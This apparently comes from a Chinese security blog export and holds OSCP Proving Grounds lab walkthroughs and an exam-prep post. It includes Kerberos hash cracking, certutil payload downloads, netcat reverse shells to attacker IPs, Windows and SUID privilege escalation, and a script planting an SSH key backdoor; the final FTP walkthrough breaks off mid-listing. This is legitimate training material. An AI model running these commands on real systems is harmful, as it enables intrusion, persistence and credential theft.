<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt svc_mssql.hash</span><br><span class="line">Using default input encoding<span class="punctuation">:</span> UTF<span class="number">-8</span></span><br><span class="line">Loaded <span class="number">1</span> password hash (krb5tgs<span class="punctuation">,</span> Kerberos <span class="number">5</span> TGS etype <span class="number">23</span> <span class="punctuation">[</span>MD4 HMAC-MD5 RC4<span class="punctuation">]</span>)</span><br><span class="line">Will run <span class="number">8</span> OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort<span class="punctuation">,</span> almost any other key for status</span><br><span class="line">trustno1         (?)</span><br><span class="line"><span class="number">1</span>g <span class="number">0</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">00</span> DONE (<span class="number">2025</span><span class="number">-02</span><span class="number">-07</span> <span class="number">21</span><span class="punctuation">:</span><span class="number">57</span>) <span class="number">16.66</span>g/s <span class="number">34133</span>p/s <span class="number">34133</span>c/s <span class="number">34133</span>C/s <span class="number">123456.</span>.lovers1</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure>

<p>使用runascs 在命令行使用svc_mssql反弹shell</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">PS C<span class="punctuation">:</span>\Users\Public&gt; certutil -urlcache -f http<span class="punctuation">:</span><span class="comment">//192.168.45.189/Invoke-RunasCs.ps1 Invoke-RunasCs.ps1</span></span><br><span class="line">certutil -urlcache -f http<span class="punctuation">:</span><span class="comment">//192.168.45.189/Invoke-RunasCs.ps1 Invoke-RunasCs.ps1</span></span><br><span class="line">****  Online  ****</span><br><span class="line">CertUtil<span class="punctuation">:</span> -URLCache command completed successfully.</span><br><span class="line">PS C<span class="punctuation">:</span>\Users\Public&gt; import-module .\Invoke-RunasCs.ps1</span><br><span class="line">import-module .\Invoke-RunasCs.ps1</span><br><span class="line"></span><br><span class="line">PS C<span class="punctuation">:</span>\Users\Public&gt; import-module .\Invoke-RunasCs.ps1</span><br><span class="line">import-module .\Invoke-RunasCs.ps1</span><br><span class="line">PS C<span class="punctuation">:</span>\Users\Public&gt; Invoke-RunasCs svc_mssql trustno1 &#x27;nc.exe <span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span> <span class="number">4446</span> -e powershell&#x27;</span><br><span class="line">Invoke-RunasCs svc_mssql trustno1 &#x27;nc.exe <span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span> <span class="number">4446</span> -e powershell&#x27;</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Warning<span class="punctuation">:</span> The logon for user &#x27;svc_mssql&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;<span class="number">8</span>&#x27; to obtain a more privileged token.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">No output received from the process.</span><br><span class="line"></span><br><span class="line">PS C<span class="punctuation">:</span>\Users\Public&gt;</span><br><span class="line">PS C<span class="punctuation">:</span>\Users\Public&gt;</span><br><span class="line"></span><br><span class="line">PS C<span class="punctuation">:</span>\Users\Public&gt; Invoke-RunasCs svc_mssql trustno1 &#x27;nc.exe <span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span> <span class="number">4446</span> -e powershell&#x27;</span><br><span class="line">Invoke-RunasCs svc_mssql trustno1 &#x27;nc.exe <span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span> <span class="number">4446</span> -e powershell&#x27;</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Warning<span class="punctuation">:</span> The logon for user &#x27;svc_mssql&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;<span class="number">8</span>&#x27; to obtain a more privileged token.</span><br><span class="line"></span><br><span class="line">No output received from the process.</span><br></pre></td></tr></table></figure>

<p>获取svc_mssql shell</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nlvp <span class="number">4446</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">4446</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.189</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.197</span><span class="number">.187</span><span class="punctuation">]</span> <span class="number">50114</span></span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C<span class="punctuation">:</span>\Windows\system32&gt; whoami</span><br><span class="line">whoami</span><br><span class="line">access\svc_mssql</span><br><span class="line">PS C<span class="punctuation">:</span>\Windows\system32&gt; whoami /all</span><br><span class="line">whoami /all</span><br></pre></td></tr></table></figure>

<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><p>walkThroughf 利用的是SeManageVolumePrivilege提权，过程有点复杂，按步骤没利用成功</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">PS C<span class="punctuation">:</span>\users\public&gt; whoami /priv</span><br><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                      State</span><br><span class="line">============================= ================================ ========</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain       Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking         Enabled</span><br><span class="line">SeManageVolumePrivilege       Perform volume maintenance tasks Disabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled</span><br><span class="line">PS C<span class="punctuation">:</span>\users\public&gt;</span><br></pre></td></tr></table></figure>

<p>记录步骤如下, release下载<strong>SeManageVolumeExploit.exe</strong> , 执行后buildin users有C:&#x2F;Windows的FULL permissions</p>
<blockquote>
<p><a href="https://github.com/CsEnox/SeManageVolumeExploit">https://github.com/CsEnox/SeManageVolumeExploit</a></p>
<p><a href="https://github.com/CsEnox/SeManageVolumeExploit/releases">https://github.com/CsEnox/SeManageVolumeExploit/releases</a></p>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">C<span class="punctuation">:</span>\xampp\htdocs\uploads&gt;whoami</span><br><span class="line">access\svc_mssql</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\xampp\htdocs\uploads&gt;SeManageVolumeExploit.exe</span><br><span class="line">Entries changed<span class="punctuation">:</span> <span class="number">865</span></span><br><span class="line">DONE </span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\xampp\htdocs\uploads&gt;icacls C<span class="punctuation">:</span>/Windows</span><br><span class="line">C<span class="punctuation">:</span>/Windows NT SERVICE\TrustedInstaller<span class="punctuation">:</span>(F)</span><br><span class="line">           NT SERVICE\TrustedInstaller<span class="punctuation">:</span>(CI)(IO)(F)</span><br><span class="line">           NT AUTHORITY\SYSTEM<span class="punctuation">:</span>(M)</span><br><span class="line">           NT AUTHORITY\SYSTEM<span class="punctuation">:</span>(OI)(CI)(IO)(F)</span><br><span class="line">           BUILTIN\Users<span class="punctuation">:</span>(M)</span><br><span class="line">           BUILTIN\Users<span class="punctuation">:</span>(OI)(CI)(IO)(F)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://github.com/sailay1996/WerTrigger">https://github.com/sailay1996/WerTrigger</a></p>
</blockquote>
<ol>
<li>Copy <strong>phoneinfo.dll</strong> to <em>_C:\Windows\System32</em>_</li>
<li>Place <strong>Report.wer</strong> file and <strong>WerTrigger.exe</strong> in a same directory.</li>
<li>Run <strong>WerTrigger.exe</strong>.</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">C<span class="punctuation">:</span>\xampp\htdocs\uploads\enox&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is CCC2-BF17</span><br><span class="line"></span><br><span class="line"> Directory of C<span class="punctuation">:</span>\xampp\htdocs\uploads\enox</span><br><span class="line"></span><br><span class="line"><span class="number">10</span>/<span class="number">10</span>/<span class="number">2021</span>  <span class="number">07</span><span class="punctuation">:</span><span class="number">25</span> PM    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">10</span>/<span class="number">10</span>/<span class="number">2021</span>  <span class="number">07</span><span class="punctuation">:</span><span class="number">25</span> PM    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">10</span>/<span class="number">10</span>/<span class="number">2021</span>  <span class="number">07</span><span class="punctuation">:</span><span class="number">23</span> PM             <span class="number">9</span><span class="punctuation">,</span><span class="number">252</span> Report.wer</span><br><span class="line"><span class="number">10</span>/<span class="number">10</span>/<span class="number">2021</span>  <span class="number">07</span><span class="punctuation">:</span><span class="number">23</span> PM            <span class="number">15</span><span class="punctuation">,</span><span class="number">360</span> WerTrigger.exe</span><br><span class="line">               <span class="number">2</span> File(s)         <span class="number">24</span><span class="punctuation">,</span><span class="number">612</span> bytes</span><br><span class="line">               <span class="number">2</span> Dir(s)  <span class="number">50</span><span class="punctuation">,</span><span class="number">123</span><span class="punctuation">,</span><span class="number">882</span><span class="punctuation">,</span><span class="number">496</span> bytes free</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\xampp\htdocs\uploads\enox&gt;WerTrigger.exe</span><br><span class="line">WerTrigger.exe</span><br><span class="line">c<span class="punctuation">:</span>/xampp/htdocs/uploads/nc.exe <span class="number">192.168</span><span class="number">.118</span><span class="number">.23</span> <span class="number">4444</span> -e cmd.exe</span><br></pre></td></tr></table></figure>

<p>get shell</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-<span class="punctuation">[</span>~<span class="punctuation">]</span></span><br><span class="line">└─$ nc -lvnp <span class="number">4444</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">4444</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.118</span><span class="number">.23</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.120</span><span class="number">.107</span><span class="punctuation">]</span> <span class="number">49998</span></span><br><span class="line">Microsoft Windows <span class="punctuation">[</span>Version <span class="number">10.0</span><span class="number">.17763</span><span class="number">.2746</span><span class="punctuation">]</span></span><br><span class="line">(c) <span class="number">2018</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32&gt;whoami &amp;&amp; hostname </span><br><span class="line">whoami &amp;&amp; hostname </span><br><span class="line">nt authority\system</span><br><span class="line">SERVER</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
<li>发现上传jpg文件按文本传输时，应该搜索解决办法，毕竟在当时是唯一的可利用的点</li>
<li>获取apache shell之后，收集信息看到svc_mssql时不要认为是一个类似系统账号的用户，就像之前靶机的V.Ventz用户一样，发现什么就是什么，多尝试</li>
<li>AD的知识太匮乏了，需要多学习总结，什么场景下能利用什么要有清晰的概念才行</li>
</ol>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Austronaut</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-33.png.png"></p>
<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-34.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">python <span class="number">49973.</span>py</span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-32.png.png"></p>
<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><p>linpeas</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">www-data@gravity<span class="punctuation">:</span>~/html/grav-admin$ chmod +x linpeas_linux_amd64</span><br><span class="line">chmod +x linpeas_linux_amd64</span><br><span class="line">www-data@gravity<span class="punctuation">:</span>~/html/grav-admin$ ./linpeas_linux_amd64</span><br><span class="line">./linpeas_linux_amd64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">4.6</span>M Feb <span class="number">23</span>  <span class="number">2023</span> /usr/bin/php7<span class="number">.4</span> (Unknown SUID binary!)</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">If the binary has the SUID bit set<span class="punctuation">,</span> it does not drop the elevated privileges and may be abused to access the file system<span class="punctuation">,</span> escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p<span class="punctuation">,</span> omit the -p argument on systems like Debian (&lt;= Stretch) that allow the default sh shell to run with SUID privileges.</span><br><span class="line">This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo install -m =xs $(which php) .</span><br><span class="line"></span><br><span class="line">CMD=<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">./php -r <span class="string">&quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">www-data@gravity<span class="punctuation">:</span>~/html/grav-admin$ CMD=<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">CMD=<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">www-data@gravity<span class="punctuation">:</span>~/html/grav-admin$ /usr/bin/php7<span class="number">.4</span> -r <span class="string">&quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span></span><br><span class="line">&lt;/usr/bin/php7<span class="number">.4</span> -r <span class="string">&quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) euid=<span class="number">0</span>(root) groups=<span class="number">33</span>(www-data)</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">flag1.txt</span><br><span class="line">proof.txt</span><br><span class="line">snap</span><br><span class="line">cat flag1.txt</span><br><span class="line">T2Zmc2Vj</span><br><span class="line">cat proof.txt</span><br><span class="line">fe673fa7494c0960b67301335ecc2539</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>OSCP认证总结</title>
    <url>/post/20250503151126.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>考试之前也看了很多师傅们考OSCP的经验，有的师傅只简单过一下课程内容和challeng lab后就能通过考试，有些师傅考了几次都没有过。是否能通过认证考试取决于自己目前掌握知识水平和每天能在课程和Lab中花费的时间，所以不要拿自己和别人比较，我们也没法复制别人的学习路线。</p>
<p>我的本职工作是后端开发，因为对安全比较感兴趣，之前零散学过一些知识，现在准备转行，萌生了考个证书作为敲门砖的想法，最初准备考CISP-PTE，在了解OSCP之后，发现差不多的价钱OSCP更有含金量。<br>本文内容请基于我已掌握了以下知识来阅读：</p>
<ul>
<li>熟练使用linux</li>
<li>掌握Python、Go、PHP语言</li>
<li>英文阅读能力尚可，毕竟翻译软件我是会用的<br>同样地，以下内容只是一个刚通过OSCP考试的渗透测试初学者的经验，参考价值有限</li>
</ul>
<h2 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h2><p>从24年10月份开始学习到25年4月初通过考试，总计花费5个月时间。<br>2024.9底购买了offsec <a href="https://portal.offsec.com/buy-more-select-product">90天课程+Exam package</a>, 趁着十一假期突击学习了一波<br>2024.10月至11月中旬，利用下班后的时间学完了课程内容，预约了元旦假期考试<br>2024.11月中旬-2025.1，因为公司春节活动，包括周末在内每天高强度加班，期间没看课程相关内容, 期间又改了2次考试时间<br>2024.12月底，课程过期，Challenge Lab只做过第一个Secura<br>2025.1 购买<a href="https://portal.offsec.com/labs/practice">Proving Grounds Practice</a>，按照<a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview">TjNull List</a>开始联系Machine<br>2025.2 又续了一个月，但是因为考试预约时间已经改了2次了，也不想继续拖下去，在元宵节前的周末参加了考试，此时总计刷了大概15台Machine, 结果毫无疑问地挂了，得了20分<br>2025.3月初，订阅Learning Unlimited后，本着这次不过1个月后还能再来一次的想法，预约了3月底的考试<br>2025.4.1 考试通过</p>
<blockquote>
<p><a href="https://discord.gg/G2Mge4JC">Discord</a>里的有个师傅公司有22% off, Discord里也有很多备考经验分享, 每天看看师傅们讨论也能学习到不少知识, 氛围非常友好活跃。即使问一些很初级的问题，师傅们也会耐心解答，给我的备考帮助很大，在这里感谢师傅们</p>
</blockquote>
<p>为什么选择Learn Unlimitd?<br>因为当时课程已经结束，而Challenge Lab我还没有做，如果续lab(30天)+补考的话需要$359+$249，实在是有点太贵了，并且当时有点没信心，如果考不过的话补考又需要$249。此外，我希望能继续学习其他课程，掌握更多知识，因此Learn Unlimited在当时是最佳选择。</p>
<h2 id="关于课程"><a href="#关于课程" class="headerlink" title="关于课程"></a>关于课程</h2><h3 id="我学到了什么"><a href="#我学到了什么" class="headerlink" title="我学到了什么"></a>我学到了什么</h3><ol>
<li>PEN-200课程给我最大的感受是它是在教学生构建自己的方法论，这点对现阶段的我来说非常适用，课程结束之后对渗透测试有了初步的完整轮廓</li>
<li>Windows以及AD是我此前完全不懂的内容，通过课程学习之后对这部分基础有了一定认识</li>
<li>英语阅读能力得到了提升，之前看到大篇幅的英文文档时，第一想法是用翻译软件翻译，但是因为有些翻译不达意，逐渐养成了能静下心来逐句阅读的好习惯</li>
</ol>
<h3 id="一定要做的事"><a href="#一定要做的事" class="headerlink" title="一定要做的事"></a>一定要做的事</h3><ol>
<li>课程中一定要做笔记，一方面系统梳理知识点，另一方面很多工具的常用参数记录下来，在考试时和日后工作中能快速检索。我认为笔记是能否通过考试的关键</li>
<li>PG Machine是最好的练习，Machine肯定做的越多越好，毕竟我们的目的不只是通过考试，而是学习积累渗透测试经验，但话说回来，TjNull列表中的Machine刷完就足以应对考试了</li>
<li><a href="https://www.youtube.com/watch?v=gY_9Dncjw-s">Drrow C</a> play list在考试前一定要过一遍，AD思路基本可以应对考试</li>
<li>Challenge Lab中OSCP A&#x2F;B&#x2F;C中应该至少选择一个尝试在24小时内完成，并写一份完整的渗透测试报告（我没有写报告导致交报告时的时间很紧张）</li>
</ol>
<h3 id="其他重要的事"><a href="#其他重要的事" class="headerlink" title="其他重要的事"></a>其他重要的事</h3><ul>
<li>熟练使用常用工具，你肯定不想在考试时调试使用不熟练的工具，我第一次考试就是 <code>ligolo-ng</code>掩码写错了，导致内网转发网络不通，还找了监考帮忙确认机器是否有问题，浪费了2个小时</li>
<li>最终前人的经验总结，它们的背后应该都有一段血泪的经历，之前看到很多师傅说reverse shell时最好使用Machine自身开放的端口，而我此前一直用80或443没有遇到过问题，因此对此不以为意，直到我也有了一段惨痛的教训</li>
<li>不要过于依赖自动化信息收集工具，练习手动信息收集很重要，甚至我们可以自己写一个收集信息的脚本，关键点在于我们需要知道哪些信息是需要关注的</li>
<li>课程中文字内容比视频更详尽，推荐先阅读文字，如果有问题再结合视频看</li>
<li>如果你和我一样是新手，建议多练习使用MSF，虽然在考试中对MSF的使用有限制，但是优秀工具的熟练使用对日后渗透测试应该是必须的</li>
<li>每种类型的工具最好能熟练使用两个，一些固定常见操作可以写一个小脚本或者alias，考试时能节省一些时间<br>例如：</li>
</ul>
<ol>
<li>alias： <code>ligolo=/home/kali/pentestools/Pivot/ligolo-ng/run_proxy.sh</code></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subnet=$1 # like 172.16.112.0/24</span><br><span class="line">sudo ip tuntap add user kali mode tun ligolo</span><br><span class="line">sudo ip link set ligolo up</span><br><span class="line">sudo ip route add $subnet dev ligolo</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>获取机器初始权限之后，从kali下载如下脚本，用来添加后门或者下载文件</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /bin/bash</span></span><br><span class="line">host=<span class="variable">$1</span></span><br><span class="line">host=<span class="string">&quot;http://<span class="variable">$host</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">shift</span></span><br><span class="line">tools=(<span class="string">&quot;<span class="variable">$@</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add id_ras.pub</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /home/`<span class="built_in">whoami</span>`/.ssh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ssh-rsa xxx kali@kali&#x27;</span> &gt; /home/`<span class="built_in">whoami</span>`/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义工具与文件名的对应关系</span></span><br><span class="line"><span class="built_in">declare</span> -A tool_map</span><br><span class="line">tool_map[<span class="string">&quot;nc&quot;</span>]=<span class="string">&quot;nc&quot;</span></span><br><span class="line">tool_map[<span class="string">&quot;socat&quot;</span>]=<span class="string">&quot;socat&quot;</span></span><br><span class="line">tool_map[<span class="string">&quot;linpeas&quot;</span>]=<span class="string">&quot;linpeas_linux_amd64&quot;</span></span><br><span class="line">tool_map[<span class="string">&quot;pspy&quot;</span>]=<span class="string">&quot;pspy64&quot;</span></span><br><span class="line">tool_map[<span class="string">&quot;pec.sh&quot;</span>]=<span class="string">&quot;pec.sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历工具并下载</span></span><br><span class="line"><span class="keyword">for</span> tool <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;tools[@]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> [[ -n <span class="string">&quot;<span class="variable">$&#123;tool_map[$tool]&#125;</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Downloading <span class="variable">$&#123;tool&#125;</span>...&quot;</span></span><br><span class="line">wget <span class="string">&quot;<span class="variable">$&#123;host&#125;</span>/linux/<span class="variable">$&#123;tool_map[$tool]&#125;</span>&quot;</span> -O <span class="variable">$tool</span></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="variable">$tool</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Download <span class="variable">$&#123;tool&#125;</span> Done&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Unknown tool: <span class="variable">$tool</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;All Done&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="关于考试"><a href="#关于考试" class="headerlink" title="关于考试"></a>关于考试</h2><h3 id="“技巧”"><a href="#“技巧”" class="headerlink" title="“技巧”"></a>“技巧”</h3><p>得益于国内应试教育的历练，我们都有很强的应对考试的能力。既然是考试，我认为多多少少会有一些所谓”技巧”, 以下综合自己的考试经历和多位师傅们的经验分享总结：</p>
<ol>
<li>手动枚举：考试中最重要的是枚举，比如提权时我们一般会优先使用一些自动化工具提高效率，但是有些考试机器被设置为需要手动枚举才能找到利用点，那手动枚举的关键点就是能找到 <code>考点</code>，在oscp中的考点就是 <code>find something unusual</code>,关于什么是unusual，在做过了PG Machine之后就会有明显的体会，比如一般情况下windows机器目录下有 <code>inetput</code>、<code>windows</code>、<code>users</code>、<code>Program Files(X86)</code>这几个 <code>usual</code>文件夹，除了这些之外就是 <code>unusual</code>, 如果发现像 <code>backup</code>、<code>ftp</code>或者某个程序的安装文件夹，那么基本可以确定下一步方向，在pg Machine中还遇到过有台机器中有个 <code>windows.old</code>。</li>
<li>如果在登录机器后发现了nmap工具扫描没有发现的端口，也是值得关注的 <code>something unusual</code></li>
<li>web枚举时，如果发现有员工介绍，这些名字往往可能就是username，再比如员工头像都是人像，而如果某个是卡通图片，往往也可能是关键信息，需要额外关注</li>
<li>reverse shell选择常见的端口(比如53、443)以及机器自身开放的端口来绕过一些可能的限制</li>
<li>爆破时使用字典rockyou.txt，如果没有结果使用 <code>rules/best64.rule</code>，如果仍没有结果，那么这台机器的”考点”基本上就不是密码爆破</li>
<li>通过的关键：<code>Enumerate -&gt; Enumerate -&gt; Exploit -&gt; Enumerate -&gt; Get Creds/hashes -&gt; crackmapexec/nxc -&gt; Lateral Movement and repeat…</code></li>
<li>获取权限之后修改密码或者设置后门 <code>netexec smb $IP -u administrator -p pass123 -M rdp -o ACTION=enable</code></li>
</ol>
<h2 id="关于报告"><a href="#关于报告" class="headerlink" title="关于报告"></a>关于报告</h2><p>官方的模板是word文档，我平时一般用markdown记笔记，所以想着用很多师傅在用的<a href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown">OSCP-Exam-Report-Template-Markdown</a>生成报告，但是在生成报告时遇到了一些问题，又因为我写报告的时间比较晚，临近截止时间就直接Typro导出成pdf上交了。所以报告应该是能明确说明渗透路径就行，直接参考官方模板写应该是最简单的方式。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>别把证书看得过于重要，它虽然能在某种程度上证明我们的能力，并且本文都是在讲怎么通过认证考试，也介绍了一些关于考试的所谓”技巧”，但我认为OSCP的学习过程更重要，我们在获得认证的同时，更重要的是拥有成为能力全面的Penetratin tester的能力。反之如果这个证书没能给我们的生活工作带来任何帮助，那它就是一张废纸。</p>
]]></content>
      <categories>
        <category>What We Got-臭鱼烂虾</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - AuthBy</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<h1 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-101.png.png"></p>
<p>开放端口</p>
<ul>
<li>21 ftp  可以匿名登录</li>
<li>242 web访问需要密码，目录扫描返回都是401</li>
</ul>
<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ftp -a -A <span class="number">192.168</span><span class="number">.173</span><span class="number">.46</span></span><br><span class="line">Connected to <span class="number">192.168</span><span class="number">.173</span><span class="number">.46</span>.</span><br><span class="line"><span class="number">220</span> zFTPServer v6<span class="number">.0</span><span class="punctuation">,</span> build <span class="number">2011</span><span class="number">-10</span><span class="number">-17</span> <span class="number">14</span><span class="punctuation">:</span><span class="number">25</span> ready.</span><br><span class="line"><span class="number">331</span> User name received<span class="punctuation">,</span> need password.</span><br><span class="line"><span class="number">230</span> User logged in<span class="punctuation">,</span> proceed.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line"><span class="number">200</span> EPRT Command successful.</span><br><span class="line"><span class="number">150</span> Opening connection for /bin/ls.</span><br><span class="line">total <span class="number">9680</span></span><br><span class="line">----------   <span class="number">1</span> root     root      <span class="number">5610496</span> Oct <span class="number">18</span>  <span class="number">2011</span> zFTPServer.exe</span><br><span class="line">----------   <span class="number">1</span> root     root           <span class="number">25</span> Feb <span class="number">10</span>  <span class="number">2011</span> UninstallService.bat</span><br><span class="line">----------   <span class="number">1</span> root     root      <span class="number">4284928</span> Oct <span class="number">18</span>  <span class="number">2011</span> Uninstall.exe</span><br><span class="line">----------   <span class="number">1</span> root     root           <span class="number">17</span> Aug <span class="number">13</span>  <span class="number">2011</span> StopService.bat</span><br><span class="line">----------   <span class="number">1</span> root     root           <span class="number">18</span> Aug <span class="number">13</span>  <span class="number">2011</span> StartService.bat</span><br><span class="line">----------   <span class="number">1</span> root     root         <span class="number">8736</span> Nov <span class="number">09</span>  <span class="number">2011</span> Settings.ini</span><br><span class="line">dr-xr-xr-x   <span class="number">1</span> root     root          <span class="number">512</span> Feb <span class="number">05</span> <span class="number">10</span><span class="punctuation">:</span><span class="number">21</span> log</span><br><span class="line">----------   <span class="number">1</span> root     root         <span class="number">2275</span> Aug <span class="number">09</span>  <span class="number">2011</span> LICENSE.htm</span><br><span class="line">----------   <span class="number">1</span> root     root           <span class="number">23</span> Feb <span class="number">10</span>  <span class="number">2011</span> InstallService.bat</span><br><span class="line">dr-xr-xr-x   <span class="number">1</span> root     root          <span class="number">512</span> Nov <span class="number">08</span>  <span class="number">2011</span> extensions</span><br><span class="line">dr-xr-xr-x   <span class="number">1</span> root     root          <span class="number">512</span> Nov <span class="number">08</span>  <span class="number">2011</span> certificates</span><br><span class="line">dr-xr-xr-x   <span class="number">1</span> root     root          <span class="number">512</span> Aug <span class="number">03</span>  <span class="number">2024</span> accounts</span><br><span class="line"><span class="number">226</span> Closing data connection.</span><br><span class="line">ftp&gt; cd accounts</span><br><span class="line"><span class="number">250</span> CWD Command successful.</span><br><span class="line">ftp&gt; ls</span><br><span 